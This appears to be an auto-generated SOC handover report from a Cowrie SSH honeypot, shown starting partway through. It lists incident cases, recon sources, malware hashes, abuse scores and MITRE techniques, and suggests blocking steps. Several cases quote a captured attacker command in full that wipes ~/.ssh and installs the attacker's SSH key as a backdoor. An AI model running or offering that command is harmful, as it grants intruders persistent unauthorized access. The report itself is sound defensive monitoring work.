| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:36:22` | `cowrie.session.connect` |
| `2026-04-10 05:36:22` | `cowrie.client.version` |
| `2026-04-10 05:36:22` | `cowrie.client.kex` |
| `2026-04-10 05:36:23` | `cowrie.login.success` |
| `2026-04-10 05:36:24` | `cowrie.session.params` |
| `2026-04-10 05:36:24` | `cowrie.command.input` |
| `2026-04-10 05:36:24` | `cowrie.command.failed` |
| `2026-04-10 05:36:24` | `cowrie.log.closed` |
| `2026-04-10 05:36:25` | `cowrie.session.params` |
| `2026-04-10 05:36:25` | `cowrie.command.input` |
| `2026-04-10 05:36:25` | `cowrie.session.file_download` |
| `2026-04-10 05:36:25` | `cowrie.log.closed` |
| `2026-04-10 05:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc7e95b1d7a7

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:36 |
| **Last Seen** | 2026-04-10 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:36:28` | `cowrie.session.connect` |
| `2026-04-10 05:36:28` | `cowrie.client.version` |
| `2026-04-10 05:36:28` | `cowrie.client.kex` |
| `2026-04-10 05:36:29` | `cowrie.login.success` |
| `2026-04-10 05:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43333b1cf954

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:40 |
| **Last Seen** | 2026-04-10 05:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:40:03` | `cowrie.session.connect` |
| `2026-04-10 05:40:03` | `cowrie.client.version` |
| `2026-04-10 05:40:03` | `cowrie.client.kex` |
| `2026-04-10 05:40:04` | `cowrie.login.success` |
| `2026-04-10 05:40:05` | `cowrie.session.params` |
| `2026-04-10 05:40:05` | `cowrie.command.input` |
| `2026-04-10 05:40:05` | `cowrie.command.failed` |
| `2026-04-10 05:40:05` | `cowrie.log.closed` |
| `2026-04-10 05:40:06` | `cowrie.session.params` |
| `2026-04-10 05:40:06` | `cowrie.command.input` |
| `2026-04-10 05:40:06` | `cowrie.session.file_download` |
| `2026-04-10 05:40:06` | `cowrie.log.closed` |
| `2026-04-10 05:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce07f74b6d8

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:40 |
| **Last Seen** | 2026-04-10 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:40:09` | `cowrie.session.connect` |
| `2026-04-10 05:40:09` | `cowrie.client.version` |
| `2026-04-10 05:40:09` | `cowrie.client.kex` |
| `2026-04-10 05:40:10` | `cowrie.login.success` |
| `2026-04-10 05:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5751950a548

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:41 |
| **Last Seen** | 2026-04-10 05:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:41:51` | `cowrie.session.connect` |
| `2026-04-10 05:41:51` | `cowrie.client.version` |
| `2026-04-10 05:41:52` | `cowrie.client.kex` |
| `2026-04-10 05:41:53` | `cowrie.login.success` |
| `2026-04-10 05:41:53` | `cowrie.session.params` |
| `2026-04-10 05:41:53` | `cowrie.command.input` |
| `2026-04-10 05:41:53` | `cowrie.command.failed` |
| `2026-04-10 05:41:54` | `cowrie.log.closed` |
| `2026-04-10 05:41:54` | `cowrie.session.params` |
| `2026-04-10 05:41:54` | `cowrie.command.input` |
| `2026-04-10 05:41:55` | `cowrie.session.file_download` |
| `2026-04-10 05:41:55` | `cowrie.log.closed` |
| `2026-04-10 05:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edd07f7e9cf2

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:41 |
| **Last Seen** | 2026-04-10 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:41:57` | `cowrie.session.connect` |
| `2026-04-10 05:41:57` | `cowrie.client.version` |
| `2026-04-10 05:41:58` | `cowrie.client.kex` |
| `2026-04-10 05:41:59` | `cowrie.login.success` |
| `2026-04-10 05:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-185ead612768

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 05:42 |
| **Last Seen** | 2026-04-10 05:43 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:42:55` | `cowrie.session.connect` |
| `2026-04-10 05:42:55` | `cowrie.client.version` |
| `2026-04-10 05:42:59` | `cowrie.client.kex` |
| `2026-04-10 05:43:01` | `cowrie.login.success` |
| `2026-04-10 05:43:03` | `cowrie.session.params` |
| `2026-04-10 05:43:03` | `cowrie.command.input` |
| `2026-04-10 05:43:03` | `cowrie.command.failed` |
| `2026-04-10 05:43:03` | `cowrie.log.closed` |
| `2026-04-10 05:43:05` | `cowrie.session.params` |
| `2026-04-10 05:43:05` | `cowrie.command.input` |
| `2026-04-10 05:43:05` | `cowrie.session.file_download` |
| `2026-04-10 05:43:05` | `cowrie.log.closed` |
| `2026-04-10 05:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce4058f1c614

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 05:43 |
| **Last Seen** | 2026-04-10 05:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:43:12` | `cowrie.session.connect` |
| `2026-04-10 05:43:12` | `cowrie.client.version` |
| `2026-04-10 05:43:15` | `cowrie.client.kex` |
| `2026-04-10 05:43:17` | `cowrie.login.success` |
| `2026-04-10 05:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a626a6937e4c

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:45 |
| **Last Seen** | 2026-04-10 05:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:45:29` | `cowrie.session.connect` |
| `2026-04-10 05:45:29` | `cowrie.client.version` |
| `2026-04-10 05:45:29` | `cowrie.client.kex` |
| `2026-04-10 05:45:30` | `cowrie.login.success` |
| `2026-04-10 05:45:31` | `cowrie.session.params` |
| `2026-04-10 05:45:31` | `cowrie.command.input` |
| `2026-04-10 05:45:31` | `cowrie.command.failed` |
| `2026-04-10 05:45:31` | `cowrie.log.closed` |
| `2026-04-10 05:45:32` | `cowrie.session.params` |
| `2026-04-10 05:45:32` | `cowrie.command.input` |
| `2026-04-10 05:45:32` | `cowrie.session.file_download` |
| `2026-04-10 05:45:32` | `cowrie.log.closed` |
| `2026-04-10 05:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5af506c2f42b

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:45 |
| **Last Seen** | 2026-04-10 05:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:45:35` | `cowrie.session.connect` |
| `2026-04-10 05:45:35` | `cowrie.client.version` |
| `2026-04-10 05:45:35` | `cowrie.client.kex` |
| `2026-04-10 05:45:36` | `cowrie.login.success` |
| `2026-04-10 05:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5b9f801b98a

| Field | Detail |
|---|---|
| **Source IP** | `213.215.209[.]101` |
| **First Seen** | 2026-04-10 05:45 |
| **Last Seen** | 2026-04-10 05:46 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:45:46` | `cowrie.session.connect` |
| `2026-04-10 05:45:46` | `cowrie.client.version` |
| `2026-04-10 05:45:46` | `cowrie.client.kex` |
| `2026-04-10 05:45:47` | `cowrie.login.success` |
| `2026-04-10 05:46:32` | `cowrie.session.file_upload` |
| `2026-04-10 05:46:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.215.209[.]101` to AbuseIPDB if not already reported
- [ ] Block `213.215.209[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.135.41[.]41` | **25** | 2026-04-10 03:31 | 2026-04-10 03:37 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `41.242.115[.]84` | **25** | 2026-04-10 05:01 | 2026-04-10 05:47 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `50.35.168[.]148` | **15** | 2026-04-10 05:03 | 2026-04-10 05:53 | 1m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.131.220[.]121` | **6** | 2026-04-10 03:41 | 2026-04-10 03:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.163.14[.]131` | **2** | 2026-04-10 02:14 | 2026-04-10 02:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-04-10 03:38 | 2026-04-10 03:38 | 5s | 0 | `T1592` | 🟢 LOW |
| `112.72.182[.]52` | 1 | 2026-04-10 03:16 | 2026-04-10 03:16 | 13s | 0 | `T1592` | 🟢 LOW |
| `165.154.226[.]237` | 1 | 2026-04-10 05:11 | 2026-04-10 05:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.195.0[.]110` | 1 | 2026-04-10 05:35 | 2026-04-10 05:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-04-10 02:32 | 2026-04-10 02:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.101.137[.]46` | 1 | 2026-04-10 04:22 | 2026-04-10 04:22 | 8s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-04-10 03:32 | 2026-04-10 03:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `75.3.252[.]21` | 1 | 2026-04-10 04:06 | 2026-04-10 04:06 | 30s | 0 | `T1592` | 🟢 LOW |
| `76.79.213[.]69` | 1 | 2026-04-10 05:01 | 2026-04-10 05:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 35/100 | 🟢 LOW | **15/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `47.101.137[.]46` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 26 |
| `165.154.226[.]237` | TW | Scloud Pte Ltd t/a Scloud Pte Ltd | **100** ⚠️ | 4 |
| `139.135.41[.]41` | PK | Cyber Internet Services Pakistan | **100** ⚠️ | 12 |
| `45.33.109[.]8` | US | Linode | **100** ⚠️ | 50 |
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `75.3.252[.]21` | US | AT&T Enterprises, LLC | **100** ⚠️ | 32 |
| `103.203.57[.]19` | US | Beijing Tiantexin Tech. Co., Ltd. | **100** ⚠️ | 50 |
| `213.215.209[.]101` | IT | Babylon Cloud SpA | **100** ⚠️ | 45 |
| `69.164.217[.]74` | US | Linode | **100** ⚠️ | 50 |
| `41.242.115[.]84` | GH | DOLPHIN TELECOMMUNICATION LIMITED | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 90 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 41 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 36 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 20 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 125 cases |
| Tool 34  | Credential Extractor        | ✅ 77 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 17 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 41 priority case(s) shown individually · 14 recon entry/entries in table (5 group(s) consolidating 73 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-10T05:57:35Z_
